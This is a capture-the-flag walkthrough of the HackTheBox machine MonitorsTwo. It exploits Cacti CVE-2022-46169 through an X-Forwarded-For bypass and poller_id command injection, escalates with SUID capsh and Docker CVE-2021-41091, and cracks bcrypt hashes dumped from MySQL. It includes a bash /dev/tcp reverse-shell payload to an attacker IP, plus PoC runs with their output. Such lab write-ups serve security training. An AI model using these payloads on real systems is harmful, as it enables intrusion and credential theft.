---
title: HTB - MonitorsTwo
date: 2024-01-24
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, monitorstwo, nmap]
img_path: /assets/htb/fullpwn/monitorsTwo
published: true
image:
    path: machine_info.png
---

## Overview

[MonitorsTwo](https://app.hackthebox.com/machines/MonitorsTwo) is an Easy Difficulty Linux machine showcasing a variety of vulnerabilities and misconfigurations. 

**Initial foothold**:
	Initial enumeration exposes a web application prone to pre-authentication Remote Code Execution (RCE) through a malicious X-Forwarded-For header. Exploiting this vulnerability grants a shell within a Docker container. 
	
**Privilege escalation (1)**:
	A misconfigured capsh binary with the SUID bit set allows for root access inside the container. 
	
**Lateral movement**:
	Uncovering MySQL credentials enables the dumping of a hash, which, once cracked, provides SSH access to the machine.
	
**Privilege escalation (2)**:
	Further enumeration reveals a vulnerable Docker version that permits a low-privileged user to access mounted container filesystems. Leveraging root access within the container, a bash binary with the SUID bit set is copied, resulting in privilege escalation on the host.

## Information gathering

Port-scanning with Nmap:

```bash
sudo nmap -sS -A -Pn --min-rate 10000 -p- 10.10.11.211

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

Info from Nmap's output:
- `nginx 1.18.0` web server listening, seems a login portal.
- SSH server listening, but we need creds for using it.

## Initial Foothold

Homepage:

![](home.png){: .normal width="65%"}

We have the app's version: `Cacti 1.2.22`, so before doing anything else let's search for known vulnerabilities:

![](cacti_cve.png){: .normal width="60%"}

We have 4/4 references for the same RCE vulnerability: [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)! 

**Vulnerability**:
	The exploit consists of accessing the vulnerable `/remote_agent.php` endpoint, whose authentication can be bypassed due to a weak implementation of the `get_client_addr` function that uses a user-controlled header, namely `X-Forwarded-For` , to authenticate the client. Once that initial check is bypassed, we then trigger the `poll_for_data` function via the `polldata` action, which is vulnerable to command injection via the `$poller_id` parameter that is passed to `proc_open` , a PHP function that executes system commands.

Let's try this [PoC](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22):

```bash
# setting up a listener
$ nc -lvnp 1337
listening on [any] 1337 ...
```

```bash
# clone the git repo
$ sudo git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
Cloning into 'CVE-2022-46169-CACTI-1.2.22'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 4), reused 4 (delta 1), pack-reused 0
Receiving objects: 100% (18/18), 5.07 KiB | 2.53 MiB/s, done.
Resolving deltas: 100% (4/4), done.

$ cd CVE-2022-46169-CACTI-1.2.22/

$ python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.14.33 --LPORT=1337
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
```

```bash
# catching the reverse shell
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.33] from (UNKNOWN) [10.10.11.211] 39056
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$
```

That was fast and easy!

## Privilege escalation (1)

After enumerating different directories and files, nothing interesting pops up. The only think to note is that we are within a `docker` container as indicated by the `/.dockerenv` file, and it also apparent from our hostname, i.e., `www-data@50bca5e748b0`:

```bash
www-data@50bca5e748b0:/var/www/html$ ls -la /
total 88
drwxr-xr-x   1 root root 4096 Mar 21  2023 .
drwxr-xr-x   1 root root 4096 Mar 21  2023 ..
-rwxr-xr-x   1 root root    0 Mar 21  2023 .dockerenv
drwxr-xr-x   1 root root 4096 Mar 22  2023 bin
```

We can check if there is anything interesting that can be run with elevated privs:

```bash
www-data@50bca5e748b0:/var/www/html$ find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

There is the binary `capsh` which stands out. Doing a quick search on [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/#suid) we get this:

![](gtfobins.png){: .normal width="60%"}

Let's follow GFTO's guidance:

```bash
www-data@50bca5e748b0:/var/www$ /sbin/capsh --gid=0 --uid=0 --
/sbin/capsh --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

And we got root...but no flag yet as we are still in a containerized shell!

## Lateral movement

When listing the files in the root directory (`/`), we see a script called `entrypoint.sh`:

```bash
ls -l
total 76
drwxr-xr-x   1 root root 4096 Mar 22  2023 bin
drwxr-xr-x   2 root root 4096 Mar 22  2023 boot
drwxr-xr-x   5 root root  340 Jan 25 14:34 dev
-rw-r--r--   1 root root  648 Jan  5  2023 entrypoint.sh
<SNIP>

cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

We see multiple `mysql` commands executed as `root`. The script also reveals that the username `admin` exists and the password-related field `must_change_password` is on the `user_auth` table. 

Since, we have root, we can dump the `user_auth`'s data and see what else it contains:

```bash
$ mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"
id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview    graph_settings     login_opts      policy_graphs   policy_trees    policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history        locked  failed_attempts    lastfail        reset_perms
1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb   1       on      on      on      on      on      2 11       1       1       on      -1      -1      -1              0       0       663348655
3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1               -1      -1-1               0       0       0
4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on      on      1 11       1       1       on      -1      -1              on      0       0       2135691668
```

We got two pair of creds: 
1. `admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC`
2. `marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C` 

Let's try to crack those on our attack host using `john`:

```bash
$ cat hashes
$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C

$ john hashes --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (?)
```

Since we got some creds, `marcus:funkymonkey`, we can try to SSH into our target:

```bash
ssh marcus@10.10.11.211
marcus@monitorstwo:~$ cat user.txt
<SNIP>
```

## Privilege escalation (2)

After going through numerous directories and files, we finally find something interesting:

```bash
marcus@monitorstwo:/var$ cat mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

Let's check the vulnerabilities one by one. [CVE-2021-33033](https://nvd.nist.gov/vuln/detail/CVE-2021-33033) refers to kernel version before `5.11.14`, so let's see what we have at the moment:

```bash
marcus@monitorstwo:/var$ uname -a
Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

Although this seems an outdated version, the `5.4` release series is actually the latest one according to the [official documentation](https://wiki.ubuntu.com/FocalFossa/ReleaseNotes):

![](kernel_doc.png)

[CVE-2020-25706](https://nvd.nist.gov/vuln/detail/CVE-2020-25706) is an XSS vulnerability for `Cacti 1.2.13` and the target app's version is `Cacti 1.2.22`. So, we have left with just the last one: [CVE-2021-41091](https://nvd.nist.gov/vuln/detail/CVE-2021-41091), which refers to `docker`'s engine `Moby 20.10.9` version.

Let's check `docker`'s version:

```bash
marcus@monitorstwo:/var$ docker --version
Docker version 20.10.5+dfsg1, build 55c4c88
```

Docker's version is `20.10.5`, thus, we should be able to exploit this vulnerability. After searching for PoCs, we find [this](https://github.com/UncleJ4ck/CVE-2021-41091) one. 

**Vulnerability**:
	Several dirs within `/var/lib/docker`, which are mounted on and utilized by `docker` containers, are accessible by low-privileged users. This implies that if an attacker gains `root` access inside a container, they could create arbitrary `SUID` files that an unprivileged user outside the container could interact with and use for privilege escalation.

So what we need to is:
1. Repeat our initial foothold process by using CVE-2022-46169 to gain RCE and privesc via the `capsh` binary.
2. Issue the appropriate permissions to the `bash` binary with the `chmod u+s /bin/bash` command.
3. Clone CVE-2021-41091's PoC on our attack host, transfer the bash script (`exp.sh`) on the target using `marcus` account via the SSH, and execute it using the `marcus` user.


Repeat our foothold and gain root within the container:

  ```bash
  # gaining root access within the container
  whoami
  root
  id
  uid=0(root) gid=0(root) groups=0(root),33(www-data)
  # assigning suid permission to the bash binary
  chmod u+s /bin/bash
  ```

From our attack host:

	```bash
	# clone the repo on the attack host
	$ sudo git clone https://github.com/UncleJ4ck/CVE-2021-41091
	[sudo] password for kali:
	Cloning into 'CVE-2021-41091'...
	remote: Enumerating objects: 25, done.
	remote: Counting objects: 100% (25/25), done.
	remote: Compressing objects: 100% (23/23), done.
	remote: Total 25 (delta 6), reused 3 (delta 0), pack-reused 0
	Receiving objects: 100% (25/25), 6.95 KiB | 6.96 MiB/s, done.
	Resolving deltas: 100% (6/6), done.
	# move within the directory
	$ cd CVE-2021-41091/
	# checking permissions
	$ ls -l
	total 8
	-rwxr-xr-x 1 root root 2446 Jan 25 18:18 exp.sh
	-rw-r--r-- 1 root root 2616 Jan 25 18:18 README.md
	# start a Python HTTP server
	$ python3 -m http.server
	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
	10.10.11.211 - - [25/Jan/2024 18:19:47] "GET /exp.sh HTTP/1.1" 200 -
	```

From `marcus`'s terminal:

  ```bash
  # download the script
  marcus@monitorstwo:~$ wget http://10.10.14.33:8000/exp.sh
  --2024-01-25 18:19:47--  http://10.10.14.33:8000/exp.sh
  Connecting to 10.10.14.33:8000... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 2446 (2.4K) [text/x-sh]
  Saving to: ‘exp.sh’

  exp.sh                100%[========================>]   2.39K  --.-KB/s    in 0s

  2024-01-25 18:19:47 (356 MB/s) - ‘exp.sh’ saved [2446/2446]
  # assign execute permissions
  marcus@monitorstwo:~$ chmod +x exp.sh
  # confirm permissions
  marcus@monitorstwo:~$ ls -l exp.sh
  total 8
  -rwxrwxr-x 1 marcus marcus 2446 Jan 25 18:18 exp.sh
  # execute the script
  marcus@monitorstwo:~$ ./exp.sh
  [!] Vulnerable to CVE-2021-41091
  [!] Now connect to your Docker container that is accessible and obtain root access !
  [>] After gaining root access execute this command (chmod u+s /bin/bash)

  Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
  [!] Available Overlay2 Filesystems:
  /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
  /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

  [!] Iterating over the available Overlay2 filesystems !
  [?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
  [x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

  [?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
  [!] Rooted !
  [>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
  [?] If it didnt spawn a shell go to this path and execute './bin/bash -p'

  [!] Spawning Shell
  bash-5.1# exit

  # change to the above mentioned 'Current Vulnerable Path'
  marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
  # execute the command './bin/bash -p'
  marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
  bash-5.1# id
  uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
  bash-5.1# cat /root/root.txt
  <SNIP>
  ```

![](machine_pwned.png){: width="75%" .normal}

## Extra - Manual exploitation

### Initial foothold

We can manually perform [CVE-2022-46169](https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/). Let's remember what needs to be done (based on [Rapid7's post](https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/)):

  1. If `LOCAL_DATA_ID` and/or `HOST_ID` are not set, the module will try to bruteforce the missing value(s). If a valid combination is found, the module will use these to attempt exploitation. 
  2. If `LOCAL_DATA_ID` and/or `HOST_ID` are both set, the module will immediately attempt exploitation. 
  3. During exploitation, the module sends a `GET` request to `/remote_agent.php` with the action parameter set to `polldata` and the `X-Forwarded-For` header set to the provided value for `X_FORWARDED_FOR_IP` (by default `127.0.0.1`).

We can start by intercepting a request via Burp, for example, a `POST` login request using random creds, change the HTTP method to `GET` request and the URL to `/remote_agent.php?action=polldata&local_data_ids[]={local_data_ids}&host_id={host_id}&poller_id=1{payload}`:

> _The URL path can be found [here](https://www.exploit-db.com/exploits/51166)._

![](burp_login_request.png)

![](burp_fatal_error.png)

We get the error `FATAL: You are not authorized to use this service`. Let's start by adding the `X-Forwarded-For` header with the value of `localhost` and see what happens:

![](xForwardedFor.png)

This time, we did not get a `FATAL` error, but a `Validation error` regarding the `host_id` parameter. Let's remove the variables, set all IDs to `1`, and try a simple payload, such as `sleep 5`:

> _The `sleep+5` payload is the URL-encoded version of `sleep 5` payload._

![](sleep_attempt.png)

We get no errors back, but the payload did not work either. That makes sense because based on the vulnerability's descrition:

  If a valid combination is found, the module will use these to attempt exploitation. 

Thus, we need to brute force the `local_data_id` and `host_id` parameters, until we we find a valid combination of values that will make our payload to work. We can do that using Intruder:

![](payload_pos.png)

![](payload_settings.png){: .normal width="65%"}

> _Both payload `1` and `2` are defined as a sequential list of numbers from `1` to `10`._

![](brute_results.png){: .normal width="75%"}

Intruder shows that just one combination of payloads resulted in a delay of 5 secs (caused by our `sleep+5` payload): `local_data_ids[]=6` and `host_id=1`! Let's confirm that manually:

![](burp_responseTime.png)

What happens here is that some values of the HTTP reponse `rdd_name` parameter are exploitable: `uptime` is one of them (we can find the full list of the exloitable parameters [here](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/http/cacti_unauthenticated_cmd_injection.rb#L143)). So, we brute-forcing the `local_data_id` and `host_id` parameters until one combination of them returns one of the exploitable parameters in the response:

![](proc.png){: .normal width="75%"}

![](uptime.png){: .normal width="75%"}

Now that we have found the right combination of parameter values, we can pass some reverse shell code as a payload, such as `bash -c 'bash -i >& /dev/tcp/10.10.14.6/1337 0>&1'`, URL-encode it (by pressing `CTRL+U`), open a listener on our attack host, and sent the request:

```bash
# setting up a listener
$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.211] 36722
```

![](revshell_payload.png)

```bash
# catching the revese shell
$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.211] 36722
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$
```

### Lateral movement

Ideally, we should first stabilize our shell. Python is not installed on the target, thus, we can't use the `pty` module to achieve that. However, we can use `script`:

```bash
# shell stabilization using script
www-data@50bca5e748b0:/var/www/html$ which script
which script
/usr/bin/script
www-data@50bca5e748b0:/var/www/html$ script -O /dev/null -q /bin/bash
script -O /dev/null -q /bin/bash
$ bash
bash
www-data@50bca5e748b0:/var/www/html$ ^Z
[1]+  Stopped                 nc -lvnp 1337

┌──(kali㉿CSpanias)-[~]
└─$ stty raw -echo; fg
nc -lvnp 1337

www-data@50bca5e748b0:/var/www/html$
```

We now need to get the values for the `rows` and `cols` variables from our attack host:

```bash
$ stty -a
speed 38400 baud; rows 51; columns 209; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
```

And finally, we need to set the same values on our target:

```bash
www-data@50bca5e748b0:/var/www/html$ stty rows 51 cols 209
www-data@50bca5e748b0:/var/www/html$ export TERM=xterm
```

And success, we have our initial foothold with a proper bash shell! Since this is a web app server, we should probably check for database configuration files:

```bash
# searching for configuration files
www-data@50bca5e748b0:/var/www/html$ find . | grep config
./include/config.php
./docs/images/graphs-edit-nontemplate-configuration.png
./docs/apache_template_config.html

# searching for database-related strings within the configuration file
www-data@50bca5e748b0:/var/www/html$ grep database include/config.php
 * Make sure these values reflect your actual database/host/user/password
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;
#$rdatabase_type     = 'mysql';
#$rdatabase_default  = 'cacti';
#$rdatabase_hostname = 'localhost';
#$rdatabase_username = 'cactiuser';
#$rdatabase_password = 'cactiuser';
#$rdatabase_port     = '3306';
#$rdatabase_retries  = 5;
#$rdatabase_ssl      = false;
#$rdatabase_ssl_key  = '';
#$rdatabase_ssl_cert = '';
#$rdatabase_ssl_ca   = '';
 * Save sessions to a database for load balancing
 * are defined in lib/database.php
```

The configuration file above contains all we need in order to connect to the database server:

```bash
# connecting to the mysql server
www-data@50bca5e748b0:/var/www/html$ mysql -u root -proot -h db
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 221
Server version: 5.7.40 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
# listing databases
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| cacti              |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.002 sec)
# selecting database
MySQL [(none)]> use cacti;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
# listing databases's tables
MySQL [cacti]> show tables;
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
<SNIP>
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
| user_auth_perms                     |
| user_auth_realm                     |
| user_domains                        |
| user_domains_ldap                   |
| user_log                            |
| vdef                                |
| vdef_items                          |
| version                             |
+-------------------------------------+
111 rows in set (0.001 sec)
# dumping the first row of the table to enumarate its fields
MySQL [cacti]> SELECT * FROM user_auth LIMIT 1 \G;
*************************** 1. row ***************************
                    id: 1
              username: admin
              password: $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
                 realm: 0
             full_name: Jamie Thompson
         email_address: admin@monitorstwo.htb
  must_change_password:
       password_change: on
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings: on
            login_opts: 2
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled: on
            lastchange: -1
             lastlogin: -1
      password_history: -1
                locked:
       failed_attempts: 0
              lastfail: 0
           reset_perms: 663348655
1 row in set (0.000 sec)

ERROR: No query specified
# select the fields of interest of all users from the table
MySQL [cacti]> SELECT username, password FROM user_auth ;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
| guest    | 43e9a4ab75570f5b                                             |
| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+----------+--------------------------------------------------------------+
3 rows in set (0.001 sec)
```

> [The `\G` modifier in the MySQL command line client](https://pento.net/2009/02/27/the-g-modifier-in-the-mysql-command-line-client/).

We can now try to crack these hashes in our attack host by first using `hashcat`'s autodetect mode to find out the hash type:

```bash
$ cat hashes
admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
# using hashcat's autodetect mode
$ hashcat hashes /usr/share/wordlists/rockyou.txt --username
hashcat (v6.2.6) starting in autodetect mode

<SNIP>

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+========================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].

Started: Fri Jan 26 06:42:36 2024
Stopped: Fri Jan 26 06:42:38 2024
```

Our hashes start with `$2y$`, which resemble `bcrypt` format for OSs, so we will choose the mode `3200`:

```bash
$ hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --username

<SNIP>
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: hashes
Time.Started.....: Fri Jan 26 06:46:23 2024 (7 mins, 57 secs)
Time.Estimated...: Tue Jan 30 09:23:44 2024 (4 days, 2 hours)
```

After about 8 minutes, it managed to crack one! Let's see for which user:

```bash
$ hashcat -m 3200 --username --show hashes
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
```

We can now use these creds, `marcus:funkymonkey`, for logging into SSH:

```bash
$ ssh marcus@10.10.11.211
marcus@10.10.11.211's password:
<SNIP>

You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
marcus@monitorstwo:~$
```

### Privilege escalation

Upon logging into SSH, we see the notification `You have mail.`! Let's go check it, after grabbing our user flag:

```bash
marcus@monitorstwo:~$ cat user.txt
<SNIP>

marcus@monitorstwo:~$ ls /var/mail/
marcus

marcus@monitorstwo:~$ cat /var/mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

The above email let us know about 3 CVEs, so let's check them in sequence:

1. [CVE-2021-33033](https://nvd.nist.gov/vuln/detail/CVE-2021-33033) refers to a kernel vulnerability, so first we need to see our target's kernel:

```bash
marcus@monitorstwo:~$ uname -a
Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

This is a `2021` vulnerability for versions before `5.11.14`. Our version a more recent one (although `5.4.0-147` seems older than `5.11.14`, but that's due to conventions) and we can also see from the output that the email was compiled 2 years after the discovery of this vulnerability, i.e., `UTC 2023`!

2. [CVE-2020-25706](https://nvd.nist.gov/vuln/detail/CVE-2020-25706) is an XSS vulnerability for `Cacti 1.2.13` and the target app's version is `Cacti 1.2.22`. What's more, we have already exploited this service!

![](home.png){: .normal width="60%"}

3. We have left with just the last one: [CVE-2021-41091](https://nvd.nist.gov/vuln/detail/CVE-2021-41091), which refers to `docker`'s engine `Moby 20.10.9` version.

```bash
# checking docker's verion
marcus@monitorstwo:~$ docker --version
Docker version 20.10.5+dfsg1, build 55c4c88
```

Docker's version seems to vulnerable! We can list all the `docker` directories as follows:

> _The vulnerability description refers to directories under `/var/lib/docker/`, so we are only interested in those._

```bash
# listing docker's containers
marcus@monitorstwo:~$ findmnt
TARGET                                SOURCE     FSTYPE     OPTIONS

<SNIP>
│                                                nsfs       rw
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/docker/over
├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
│                                     shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/over
└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
                                      shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
```

We must figure out which one is associated with the `Cacti` app, since our containerized shell session is within that. We can do that by creating a file from within our containerized shell session (our initial foothold), and then check if this file is available from outside the container with `marcus`.

```bash
# move to the tmp directory and create a file
www-data@50bca5e748b0:/var/www/html$ cd /tmp
www-data@50bca5e748b0:/tmp$ touch test
```

The heaviest contents are usually images and if the default storage driver `overlay2` is used, then these Docker images are stored in `/var/lib/docker/overlay2` ([freecodecamp](https://www.freecodecamp.org/news/where-are-docker-images-stored-docker-container-paths-explained/)). Therefore, we really need to check just 2 out of the 4 container paths found above:

